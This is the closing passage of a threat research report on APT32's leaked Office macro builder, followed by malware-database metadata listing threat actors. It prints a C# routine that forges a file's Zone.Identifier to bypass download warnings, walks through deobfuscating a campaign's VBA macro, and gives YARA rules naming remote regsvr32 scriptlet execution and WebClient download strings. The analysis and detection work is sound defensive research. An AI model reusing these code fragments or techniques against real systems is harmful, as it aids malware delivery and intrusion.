\"Zone.Identifier\";\n       FileInfo ADSFile = new FileInfo(textBoxADS.Text.Trim());\n       if (ADSFile.AlternateDataStreamExists(StreamName))\n       {\n         AlternateDataStreamInfo s = ADSFile.GetAlternateDataStream(StreamName,\nFileMode.Open);\n         s.Delete();\n       }\n       AlternateDataStreamInfo FileADS = ADSFile.GetAlternateDataStream(StreamName,\nFileMode.OpenOrCreate);\n       using (FileStream TWriter = FileADS.OpenWrite())\n       {\n         string ZoneTrust = \"[ZoneTransfer]\\r\\nZoneId=2\";\n         using(StreamWriter FStreamWriter = new StreamWriter(TWriter))\n         {\n           FStreamWriter.AutoFlush = true;\n           FStreamWriter.Write(ZoneTrust);\n         }\n       }\n       MessageBox.Show(\"Alternative Data Stream OK!\", \"Complete!\", MessageBoxButtons.OK,\nMessageBoxIcon.Information);\n    }\n\n```\n\nDiving further into Glitch.me campaign samples, in one MHT, we extract and base64 decode the\ncontent of Content-Location:\n```\nfile:///C:/604BB24E/DeliveryInformation_files/editdata.mso to arrive at an ActiveMime\n\n```\nblob, which we can decode with oledump and then view the VB macro content.\n\n```\nC:\\Users\\user\\Desktop>oledump ActiveMime.bin\n 1:    442 'PROJECT'\n 2:    41 'PROJECTwm'\n 3: M  13478 'VBA/ThisDocument'\n 4:   3452 'VBA/_VBA_PROJECT'\n 5:    633 'VBA/dir'\n\n```\n\n###### 63\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\nThe modern macro content is annoyingly encoded with randomized function and parameter strings and\ntedious char evaluations of octal, hex, and decimal added and subtracted together.\n\n```\nMA5SIed2hG218yR = Chr((121 - 0o164 + 0x50)) + Chr((143 + 0xD2 - 0xEE))...\n\n```\n\nWe can do a quick check of these using Python. First we find and replace all “&0” and “&H” and replace\nthose with 0o and 0x prefixes that are Python friendly. Replace any &s with +s and now we’re cookin\n[with fire. This is the exact approach that researcher Gustavo Palazolo took in this script to help decode](https://github.com/stvemillertime/NetskopeThreatLabsIOCs/blob/main/MHTGlitch/script/deobfuscate_macro_strings.py)\nthe macro strings, but we’re demonstrating it here for extra fun.\n\nNext, just test out a couple expressions at the Python CLI.\n\n```\n>>> z = \"121 - 0o164 + 0x50\"\n>>> print(chr(evaluate(z)))\nU\n>>> MA5SIed2hG218yR = chr(evaluate(\"121 - 0o164 + 0x50\")) + chr(evaluate(\"143 + 0xD2 - 0xEE\")) +\nchr(evaluate(\"0xC0 - 0xB3 + 0o130\")) + chr(evaluate(\"147 - 156 + 0o173\")) + chr(evaluate(\"13 +\n0x13\")) + chr(evaluate(\"0x48 - 0o222 + 0o213\")) + chr(evaluate(\"0o212 - 0xAF + 0o210\")) +\nchr(evaluate(\"0x9F + 0xA0 - 220\")) + chr(evaluate(\"0o220 + 88 - 0o171\")) + chr(evaluate(\"113 +\n0x4\")) + chr(evaluate(\"170 - 0x8F + 83\")) + chr(evaluate(\"196 - 0x50\"))\n>>> print(MA5SIed2hG218yR)\nUser Account\n\n```\n\nNow that we know this works, one might run through and clean up the obfuscated VB into more of a\nhuman-readable text and begin to tease out the innards of the macro.\n\n```\nPrivate Sub ePtqP5mQjVHX4H()\n  On Error Resume Next\n  aGJ5m9Jtam95y = \"Microsoft Outlook Sync\"\n  V9sMn9FaY = \"TL284151.doc\"\n  Dim MA5SIed2hG218yR As String\n  MA5SIed2hG218yR = \"User Account\"\n  RCGt2dyOgy5\n  MA5SIed2hG218yR = MA5SIed2hG218yR + \"Pictures\"\n  E0xI2h2kKxi9ra = \"background.dll\"\n  w2cHY5K1n = \"\\guest.bmp\"\n\n```\n\n###### 64\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n```\nyR1QBm2tf10 = ThisDocument.FullName\nMA5SIed2hG218yR = \"\\Microsoft\\\" + MA5SIed2hG218yR + w2cHY5K1n\nMA5SIed2hG218yR = Environ(\"AllUsersProfile\") + MA5SIed2hG218yR\nkMcnWThP5l = Environ(\"AllUsersProfile\") + \"\\\" + aGJ5m9Jtam95y\nDim b6Ot02TnO5CCSH8() As String\nb6Ot02TnO5CCSH8 = Split(kMcnWThP5l, \"\\\")\ncache = b6Ot02TnO5CCSH8(LBound(b6Ot02TnO5CCSH8))\nFor PxSn9cV7c = LBound(b6Ot02TnO5CCSH8) + 1 To UBound(b6Ot02TnO5CCSH8)\n  cache = cache + \"\\\" + b6Ot02TnO5CCSH8(PxSn9cV7c)\n  MkDir cache\n\n```\n\nEven when partially decoded, this payload macro might appear to have little to do with StrikeSuit Gift\n```\nMacros_Builder source code. But our guess is that if someone analyzes enough of the new APT32\n\n```\nmacros, they will see similarities in how the malware developer uses VB to write binary data, perform\nrandomized string generation, or do error handling.\n\nIt's not unreasonable to imagine that these 2022 MHT and macro payloads were created with heavily\nmodernized versions of the tooling found throughout the StrikeSuit Gift package. The final backdoor\nfrom this elaborate 2022 campaign purportedly uses a Windows Scheduled Task for persistence. Some\nthings never change.\n\n###### 65\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\n# Epilogue\n\n“The Gods themselves cannot recall their gifts.”\n\nTennyson\n\n\n###### 66\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\nIn our analysis of StrikeSuit Gift, we did a quick and dirty inspection of the source code, we took a\ngander at the macro builders, and we sifted through the malware and the slew of artifacts that came\nalong with it. We observed the evolutionary timeline of several interdependent code projects and we\nestablished connections to the threat actor APT32.\n\nPart of the thrill of threat analysis is that most investigations end not with final answers but with new\nquestions. We dusted off this archaic tome of APT32 macros, and through our analysis, we discovered\nfresh starting points for tracking the threat actor into the future. Intrusion operations come and go, but\nthreat actors are forever.\n\nWe plan to continue sharing unique analysis to help advance the field of threat intelligence but also to\nengage and inspire the next generations of threat analysts. We hope that this origin story and exposé\nwas informative, or at least a little bit fun. Holler if you’ve got questions, comments, corrections, or\nsomething to add; otherwise, see you around the internet.\n\n###### 67\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\n# Appendix\n\n\n###### 68\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\n###### YARA rules\n\nThese precise YARA rules may help bubble up files related to APT32 and StrikeSuit Gift.\n\n```\nrule APT32_WebBuilder_ShellcodeLoader_L_dll_timestmp\n{\n  meta:\n     author = \"Stairwell\"\n     ref = \"P17028 - StrikeSuit Gift - Office Macro Type\n1\\\\Reference\\\\WebBuilder\\\\ShellcodeLoader\\\\Test\\\\bin\\\\Release\\\\L.dll\"\n  condition:\n     pe.timestamp == 1242474426\n}\nrule APT32_MacrosBuilder_add_schedule_vba_txt_date\n{\n  meta:\n     author = \"Stairwell\"\n     ref = \"P17028 - StrikeSuit Gift - Office Macro Type\n1\\\\Reference\\\\Macros_Builder\\\\Macros_Builder\\\\Resources\\\\add_schedule_vba.txt\"\n  strings:\n     $a = \"2016-06-02T11:13:39.1668838\" ascii wide\n  condition:\n     $a\n}\nrule APT32_MacrosBuilder_add_schedule_vba_txt_startboundary\n{\n  meta:\n     author = \"Stairwell\"\n     ref = \"P17028 - StrikeSuit Gift - Office Macro Type\n1\\\\Reference\\\\Macros_Builder\\\\Macros_Builder\\\\Resources\\\\add_schedule_vba.txt\"\n  strings:\n     $a = \"2016-06-02T11:12:49.4495965\" ascii wide\n  condition:\n     $a\n}\nrule APT32_MacrosBuilder_add_schedule_vba_txt_regsvr32_to_uri\n{\n  meta:\n     author = \"Stairwell\"\n     ref = \"P17028 - StrikeSuit Gift - Office Macro Type\n1\\\\Reference\\\\Macros_Builder\\\\Macros_Builder\\\\Resources\\\\add_schedule_vba.txt\"\n  strings:\n     $a = \"\\\"\\\"\\\\\\\"\\\"regsvr32.exe\\\\\\\"\\\" /s /n /u /i:http\"\n  condition:\n\n```\n\n###### 69\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n```\n     $a\n}\nrule APT32_ActiveMime_Lure\n{\n  meta:\n     ref = \"https://www.mandiant.com/resources/cyber-espionage-apt32\"\n     courtesy_of = \"@Mandiant @TekDefense and @itsreallynick\"\n  strings:\n     $a = \"office_text\" ascii wide\n     $b = \"schtasks /create tn\" nocase ascii wide\n     $c = \"scrobj.dll\" nocase ascii wide\n     $d = \"new-object net.webclient\" ascii wide\n     $e = \"GetUserName\" ascii wide\n     $f = \"WSHnet.UserDomain\" ascii wide\n     $g = \"WSHnet.UserName\" ascii wide\n  condition:\n     4 of them\n}\nrule APT32_Macros_Builder_add_schedule_vba_SpawnBase63\n{\n  meta:\n     author = \"Stairwell\"\n     ref = \"See HtaDotNetBuilder and HtaDotnet.cs\"\n  strings:\n     $a = \"SpawnBase63\" nocase ascii wide\n     $b = \"SpawnBase63\" base64 base64wide\n     $c = \"SpawnBase63\" xor(0x01-0xff)\n  condition:\n     any of them\n}\n\n```\n\nThese broad YARA rules may help surface or identify files with exported XML scheduled tasks.\n\n```\nrule TTP_XML_Scheduled_Task_Date_pcre\n{\n  meta:\n     author = \"Stairwell\"\n     desc = \"XML Scheduled task strings with a Date that has seven digits of precision, since\nno reasonable human would type that, we can guess that these are likely exported from Windows\nTask Scheduler.\"\n  strings:\n     $xml = \"<?xml version=\\\"\"\n\n```\n\n###### 70\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n```\n     $task_xml = \"<Task version=\\\"\"\n     $pcre = /<Date>[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}\\.[0-9]{7}<\\/Date>/\nnocase ascii wide\n  condition:\n     all of them\n}\nrule TTP_XML_Scheduled_Task_StartBoundary_pcre\n{\n  meta:\n     author = \"Stairwell\"\n     desc = \"XML Scheduled task strings with a Date that has seven digits of precision, since\nno reasonable human would type that, we can guess that these are likely exported from Windows\nTask Scheduler.\"\n  strings:\n     $xml = \"<?xml version=\\\"\"\n     $task_xml = \"<Task version=\\\"\"\n     $pcre =\n/<StartBoundary>[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}\\.[0-9]{7}<\\/StartBoundary>/\nnocase ascii wide\n  condition:\n     all of them\n}\n\n```\n\n###### VTI queries\n\nMalware developers may inadvertently leak source code packages to VirusTotal, and you can find them\nby searching for odd bundles with artifacts of the development process. Try different artifacts and\ndifferent packaging types.\n\n```\ncontent:\".csproj\" type:rar positives:1+ fs:2022-04-01+\ncontent:\".sln\" type:rar positives:1+ fs:2022-04-01+\ncontent:\".suo\" type:rar positives:1+ fs:2022-04-01+\ncontent:\".pdb\" type:rar positives:1+ fs:2022-04-01+\ncontent:\".pyc\" type:rar positives:1+ fs:2022-04-01+\n\n```\n\n###### 71\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\n###### “Indicators”\n\nLook, it’s kind of a pain to give all the atomic indicators to you in a way that is easy or sensibly useful. If\nwe print out just MD5s, someone will ask for SHA256s, and if we give SHA256s, someone else will ask\nfor SHA387s. This isn’t the type of report that is really about the indicators anyway, as many of them\nare so old it doesn't really matter.\n\nIf you want to take a gander at the StrikeSuit Gift tooling, we provide links below. Jump in and get dirty!\nLooking at the source code is fun and instructive. If you are an intelligence analyst and trying to play the\ngame of connect the dots for purposes of attribution, we recommend you start with the main StrikeSuit\nGift RAR file and do your own hashing and IOC extraction from there.\n\n**StrikeSuit Gift RAR file**\n\n\nMD5: 2cac346547f90788e731189573828c53\n\n\nSHA256: 66b58b2afd274591fb8caf2dbfcf14d9c9bcf48d6c87e8df2db30cdefb0d1422\n\n\n[See it in MalShare](https://malshare.com/sample.php?action=detail&hash=66b58b2afd274591fb8caf2dbfcf14d9c9bcf48d6c87e8df2db30cdefb0d1422)\n\n[See it in VT](https://www.virustotal.com/gui/file/66b58b2afd274591fb8caf2dbfcf14d9c9bcf48d6c87e8df2db30cdefb0d1422/submissions)\n\n#### Links and references\n\n###### APT32 by year\n\nA selection of APT32 associated reports by year.\n\n|Year|Notes|\n|---|---|\n|2017|Apr 28, Kaspersky - DNS Tunneling May 17, Mandiant - APT32 Cyber Espionage Alive and Well May 24, Cybereason - Operation Cobalt Kitty by OceanLotus Jun 22, Palo Alto Networks - OceanLotus macOS backdoor Nov 11, Volexity - OceanLotus Mass Digital Surveillance|\n|2018|Mar 01, ESET - OceanLotus Old techniques, new backdoor Apr 14, Trend Micro - New OceanLotus MacOS Backdoor Oct 10, BlackBerry (Cylance) - Spy RATs of OceanLotus|\n\n\n###### 72\n\n\n-----\n\n|2019|Feb 01, Palo Alto Networks - OceanLotus Downloader KerrDown Mar 20, ESET - Keeping up with OceanLotus decoys Jul 25, NSHC - Growth of Sector F01 Espionage Apr 09, ESET - OceanLotus macOS Malware Update Apr 24, Checkpoint - Deobfuscating APT32 Flow Graphs Jun 20, Qi Anxin - OceanLotus Targets Environmental Group in Vietnam Jul 01, BlackBerry (Cylance) - Ratsnif New Network Vermin from OceanLotus Aug 01, BlackBerry (Cylance) - OceanLotus Stenography|\n|---|---|\n|2020|Apr 22, Mandiant - APT32 Targeting Wuhan and CN Gov on COVID-19 Nov 06, Volexity - OceanLotus Espionage Through Fake Websites Nov 30, Microsoft - BISMUTH Leverages Coinminers to Fly Under Radar|\n|2021|Feb 24, Amnesty International - Vietnamese Human Rights Defenders Targeted|\n|2022|Jan 11, Netskope - Abusing MS Office Using Web Archive Files Jan 20, Qi Anxin - OceanLotus Attack Using Glitch Platform|\n\n\n###### THREAT RESEARCH REPORT\n\n\n###### Office macros\n\n  - [https://www.ncsc.gov.uk/guidance/macro-security-for-microsoft-office](https://www.ncsc.gov.uk/guidance/macro-security-for-microsoft-office)\n\n  - [https://www.cyber.gov.au/acsc/view-all-content/publications/microsoft-office-macro-security](https://www.cyber.gov.au/acsc/view-all-content/publications/microsoft-office-macro-security)\n\n###### Visual Studio 2022\n\n  - [https://docs.microsoft.com/en-us/cpp/build/reference/file-types-created-for-visual-cpp-project](https://docs.microsoft.com/en-us/cpp/build/reference/file-types-created-for-visual-cpp-projects?view=msvc-140)\n[s?view=msvc-140](https://docs.microsoft.com/en-us/cpp/build/reference/file-types-created-for-visual-cpp-projects?view=msvc-140)\n\n  - [https://docs.microsoft.com/en-us/cpp/build/reference/project-and-solution-files?view=msvc-14](https://docs.microsoft.com/en-us/cpp/build/reference/project-and-solution-files?view=msvc-140)\n[0](https://docs.microsoft.com/en-us/cpp/build/reference/project-and-solution-files?view=msvc-140)\n\n  - Interop Assemblies for Office\n[https://docs.microsoft.com/en-us/visualstudio/vsto/office-primary-interop-assemblies?view=vs-](https://docs.microsoft.com/en-us/visualstudio/vsto/office-primary-interop-assemblies?view=vs-2022)\n[2022](https://docs.microsoft.com/en-us/visualstudio/vsto/office-primary-interop-assemblies?view=vs-2022)\n\n###### 73\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\nFor more information on the intelligence provided in this report,\n\n[contact us at threatresearch@stairwell.com](mailto:intel@stairwell.com)\n\nStairwell helps organizations take back the cybersecurity high ground with solutions that attackers can't evade. Its flagship\nproduct, the Inception platform, empowers security teams to outsmart any attacker. Stairwell is composed of security industry\nleaders and engineers from Google and is backed by Sequoia Capital, Accel, and Gradient Ventures. [stairwell.com](http://stairwell.com)\n\n###### 74\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://assets.stairwell.com/hubfs/Marketing-Assets/Stairwell-threat-report-The-origin-of-APT32-macros.pdf"
    ],
    "report_names": [
        "Stairwell-threat-report-The-origin-of-APT32-macros.pdf"
    ],
    "threat_actors": [
        {
            "id": "5d2bd376-fcdc-4c6a-bc2c-17ebbb5b81a4",
            "created_at": "2022-10-25T16:07:23.667223Z",
            "updated_at": "2025-03-27T02:02:09.916086Z",
            "deleted_at": null,
            "main_name": "GCHQ",
            "aliases": [
                "Government Communications Headquarters",
                "Operation Socialist"
            ],
            "source_name": "ETDA:GCHQ",
            "tools": [
                "Prax",
                "Regin",
                "WarriorPride"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "77b28afd-8187-4917-a453-1d5a279cb5e4",
            "created_at": "2022-10-25T15:50:23.768278Z",
            "updated_at": "2025-03-27T02:00:55.5423Z",
            "deleted_at": null,
            "main_name": "Inception",
            "aliases": [
                "Inception Framework",
                "Cloud Atlas"
            ],
            "source_name": "MITRE:Inception",
            "tools": [
                "PowerShower",
                "VBShower",
                "LaZagne"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3f86085e-95c5-4007-8bd7-86ad330ce4eb",
            "created_at": "2022-10-25T16:07:24.457008Z",
            "updated_at": "2025-03-27T02:02:10.238521Z",
            "deleted_at": null,
            "main_name": "Bismuth",
            "aliases": [
                "Canvas Cyclone"
            ],
            "source_name": "ETDA:Bismuth",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "870f6f62-84f5-48ca-a18e-cf2902cd6924",
            "created_at": "2022-10-25T15:50:23.303818Z",
            "updated_at": "2025-03-27T02:00:55.435309Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "APT32",
                "SeaLotus",
                "OceanLotus",
                "APT-C-00",
                "Canvas Cyclone"
            ],
            "source_name": "MITRE:APT32",
            "tools": [
                "Mimikatz",
                "ipconfig",
                "Kerrdown",
                "Cobalt Strike",
                "SOUNDBITE",
                "OSX_OCEANLOTUS.D",
                "KOMPROGO",
                "netsh",
                "RotaJakiro",
                "PHOREAL",
                "Arp",
                "Denis",
                "Goopy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "bbe36874-34b7-4bfb-b38b-84a00b07042e",
            "created_at": "2022-10-25T15:50:23.375277Z",
            "updated_at": "2025-03-27T02:00:55.457787Z",
            "deleted_at": null,
            "main_name": "APT37",
            "aliases": [
                "APT37",
                "InkySquid",
                "ScarCruft",
                "Group123",
                "TEMP.Reaper",
                "Ricochet Chollima"
            ],
            "source_name": "MITRE:APT37",
            "tools": [
                "BLUELIGHT",
                "CORALDECK",
                "KARAE",
                "SLOWDRIFT",
                "ROKRAT",
                "SHUTTERSPEED",
                "POORAIM",
                "HAPPYWORK",
                "Final1stspy",
                "Cobalt Strike",
                "NavRAT",
                "DOGCALL",
                "WINERACK"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "af509bbb-8d18-4903-a9bd-9e94099c6b30",
            "created_at": "2023-01-06T13:46:38.585525Z",
            "updated_at": "2025-03-27T02:00:02.866727Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "TIN WOODLAWN",
                "OceanLotus Group",
                "OceanLotus",
                "Sea Lotus",
                "G0050",
                "Cobalt Kitty",
                "SeaLotus",
                "ATK17",
                "Ocean Lotus",
                "Ocean Buffalo",
                "POND LOACH",
                "Canvas Cyclone",
                "APT-C-00",
                "APT-32",
                "APT 32"
            ],
            "source_name": "MISPGALAXY:APT32",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "552ff939-52c3-421b-b6c9-749cbc21a794",
            "created_at": "2023-01-06T13:46:38.742547Z",
            "updated_at": "2025-03-27T02:00:02.906537Z",
            "deleted_at": null,
            "main_name": "APT37",
            "aliases": [
                "ScarCruft",
                "Venus 121",
                "Moldy Pisces",
                "Group 123",
                "APT 37",
                "Group123",
                "Operation Daybreak",
                "Operation Erebus",
                "Red Eyes",
                "TA-RedAnt",
                "InkySquid",
                "Reaper Group",
                "Ricochet Chollima",
                "ATK4",
                "G0067"
            ],
            "source_name": "MISPGALAXY:APT37",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f1518ac1-4710-4dd1-a422-e3801e4806cb",
            "created_at": "2024-05-01T02:03:08.147856Z",
            "updated_at": "2025-03-27T02:05:17.421275Z",
            "deleted_at": null,
            "main_name": "TIN WOODLAWN",
            "aliases": [
                "Cobalt Kitty",
                "OceanLotus",
                "WOODLAWN ",
                "APT32 "
            ],
            "source_name": "Secureworks:TIN WOODLAWN",
            "tools": [
                " Denis",
                " Goopy",
                " JEShell",
                " KerrDown",
                " Mimikatz",
                " Ratsnif",
                " Remy",
                " Rizzo",
                " RolandRAT",
                "Cobalt Strike"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "f0bccc3d-ad77-49c4-8dfd-8a8a8d6fba26",
            "created_at": "2024-05-01T02:03:08.134022Z",
            "updated_at": "2025-03-27T02:05:17.415028Z",
            "deleted_at": null,
            "main_name": "NICKEL FOXCROFT",
            "aliases": [
                "Group 123 ",
                "Moldy Pisces ",
                "RICOCHET CHOLLIMA ",
                "Reaper ",
                "ScarCruft ",
                "APT37 "
            ],
            "source_name": "Secureworks:NICKEL FOXCROFT",
            "tools": [
                "ROKRAT"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "08c8f238-1df5-4e75-b4d8-276ebead502d",
            "created_at": "2023-01-06T13:46:39.344081Z",
            "updated_at": "2025-03-27T02:00:03.056208Z",
            "deleted_at": null,
            "main_name": "Copy-Paste",
            "aliases": [],
            "source_name": "MISPGALAXY:Copy-Paste",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "31da1b1f-743b-40ef-bd17-1e07c5500392",
            "created_at": "2024-06-19T02:00:04.382822Z",
            "updated_at": "2025-03-27T02:00:03.385309Z",
            "deleted_at": null,
            "main_name": "UAC-0020",
            "aliases": [
                "Vermin",
                "SickSync"
            ],
            "source_name": "MISPGALAXY:UAC-0020",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a97cf06d-c2e2-4771-99a2-c9dee0d6a0ac",
            "created_at": "2022-10-25T16:07:24.349252Z",
            "updated_at": "2025-03-27T02:02:10.184406Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "ATK 13",
                "Belugasturgeon",
                "Blue Python",
                "CTG-8875",
                "Group 88",
                "ITG12",
                "Iron Hunter",
                "Krypton",
                "Makersmark",
                "Operation Epic Turla",
                "Operation Moonlight Maze",
                "Operation Penguin Turla",
                "Operation Satellite Turla",
                "Operation Skipper Turla",
                "Operation Turla Mosquito",
                "Operation WITCHCOVEN",
                "Pacifier APT",
                "Pensive Ursa",
                "Popeye",
                "SIG15",
                "SIG2",
                "SIG23",
                "Secret Blizzard",
                "TAG-0530",
                "Turla",
                "UNC4210",
                "Venomous Bear",
                "Waterbug"
            ],
            "source_name": "ETDA:Turla",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "ATI-Agent",
                "AdobeARM",
                "Agent.BTZ",
                "Agent.DNE",
                "BigBoss",
                "COMpfun",
                "Chinch",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobra Carbon System",
                "ComRAT",
                "DoublePulsar",
                "EmPyre",
                "EmpireProject",
                "Epic Turla",
                "EternalBlue",
                "EternalRomance",
                "GoldenSky",
                "Group Policy Results Tool",
                "HTML5 Encoding",
                "HyperStack",
                "IcedCoffee",
                "IronNetInjector",
                "KSL0T",
                "Kapushka",
                "Kazuar",
                "KopiLuwak",
                "Kotel",
                "LOLBAS",
                "LOLBins",
                "LightNeuron",
                "Living off the Land",
                "Maintools.js",
                "Metasploit",
                "Meterpreter",
                "MiamiBeach",
                "Mimikatz",
                "MiniDionis",
                "Minit",
                "NBTscan",
                "NETTRANS",
                "NETVulture",
                "Neptun",
                "NetFlash",
                "NewPass",
                "Outlook Backdoor",
                "Penquin Turla",
                "Pfinet",
                "PowerShell Empire",
                "PowerShellRunner",
                "PowerShellRunner-based RPC backdoor",
                "PowerStallion",
                "PsExec",
                "PyFlash",
                "QUIETCANARY",
                "Reductor RAT",
                "RocketMan",
                "SMBTouch",
                "SScan",
                "Satellite Turla",
                "SilentMoon",
                "Sun rootkit",
                "TTNG",
                "TadjMakhal",
                "Tavdig",
                "TinyTurla",
                "TinyTurla Next Generation",
                "TinyTurla-NG",
                "Topinambour",
                "Tunnus",
                "Turla",
                "Turla SilentMoon",
                "TurlaChopper",
                "Uroburos",
                "Urouros",
                "WCE",
                "WITCHCOVEN",
                "WhiteAtlas",
                "WhiteBear",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Wipbot",
                "WorldCupSec",
                "XTRANS",
                "certutil",
                "certutil.exe",
                "gpresult",
                "nbtscan",
                "nbtstat",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8aaa5515-92dd-448d-bb20-3a253f4f8854",
            "created_at": "2024-06-19T02:03:08.147099Z",
            "updated_at": "2025-03-27T02:05:17.408118Z",
            "deleted_at": null,
            "main_name": "IRON HUNTER",
            "aliases": [
                "Belugasturgeon ",
                "Blue Python ",
                "CTG-8875 ",
                "ITG12 ",
                "KRYPTON ",
                "MAKERSMARK ",
                "Pensive Ursa ",
                "Secret Blizzard ",
                "Turla",
                "UAC-0003 ",
                "UAC-0024 ",
                "UNC4210 ",
                "Venomous Bear ",
                "Waterbug ",
                "ATK13 "
            ],
            "source_name": "Secureworks:IRON HUNTER",
            "tools": [
                " ComRAT",
                " Kazuar",
                " KopiLuwak",
                " LightNeuron",
                " Mosquito",
                " Nautilus",
                " Neuron",
                " Penquin",
                " PoisonFrog",
                " PyFlash",
                " Skipper",
                " Snake",
                " Tavdig",
                " TinyTurla",
                " Tunnus",
                "Carbon-DLL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a97fee0d-af4b-4661-ae17-858925438fc4",
            "created_at": "2023-01-06T13:46:38.396415Z",
            "updated_at": "2025-03-27T02:00:02.823045Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Uroburos",
                "Hippo Team",
                "Pacifier APT",
                "MAKERSMARK",
                "ATK13",
                "UAC-0003",
                "IRON HUNTER",
                "Waterbug",
                "TAG_0530",
                "KRYPTON",
                "Popeye",
                "SIG23",
                "UAC-0144",
                "G0010",
                "Blue Python",
                "VENOMOUS Bear",
                "Group 88",
                "Pfinet",
                "ITG12",
                "UNC4210",
                "Secret Blizzard",
                "UAC-0024"
            ],
            "source_name": "MISPGALAXY:Turla",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2439ad53-39cc-4fff-8fdf-4028d65803c0",
            "created_at": "2022-10-25T16:07:23.353204Z",
            "updated_at": "2025-03-27T02:02:09.749502Z",
            "deleted_at": null,
            "main_name": "APT 32",
            "aliases": [
                "APT 32",
                "APT-C-00",
                "APT-LY-100",
                "ATK 17",
                "Lotus Bane",
                "Ocean Buffalo",
                "OceanLotus",
                "Operation Cobalt Kitty",
                "Operation PhantomLance",
                "Pond Loach",
                "SeaLotus",
                "SectorF01",
                "Tin Woodlawn"
            ],
            "source_name": "ETDA:APT 32",
            "tools": [
                "Agentemis",
                "Android.Backdoor.736.origin",
                "AtNow",
                "Backdoor.MacOS.OCEANLOTUS.F",
                "BadCake",
                "CACTUSTORCH",
                "CamCapture Plugin",
                "CinaRAT",
                "Cobalt Strike",
                "CobaltStrike",
                "Cuegoe",
                "DKMC",
                "Denis",
                "Goopy",
                "HiddenLotus",
                "KOMPROGO",
                "KerrDown",
                "METALJACK",
                "MSFvenom",
                "Mimikatz",
                "Nishang",
                "OSX_OCEANLOTUS.D",
                "OceanLotus",
                "PHOREAL",
                "PWNDROID1",
                "PhantomLance",
                "PowerSploit",
                "Quasar RAT",
                "QuasarRAT",
                "RatSnif",
                "Remy",
                "Remy RAT",
                "Rizzo",
                "Roland",
                "Roland RAT",
                "SOUNDBITE",
                "Salgorea",
                "Splinter RAT",
                "Terracotta VPN",
                "Yggdrasil",
                "cobeacon",
                "denesRAT",
                "fingerprintjs2"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "9b02c527-5077-489e-9a80-5d88947fddab",
            "created_at": "2022-10-25T16:07:24.103499Z",
            "updated_at": "2025-03-27T02:02:10.108504Z",
            "deleted_at": null,
            "main_name": "Reaper",
            "aliases": [
                "APT 37",
                "ATK 4",
                "Cerium",
                "Crooked Pisces",
                "Geumseong121",
                "Group 123",
                "ITG10",
                "InkySquid",
                "Moldy Pisces",
                "Opal Sleet",
                "Operation Are You Happy?",
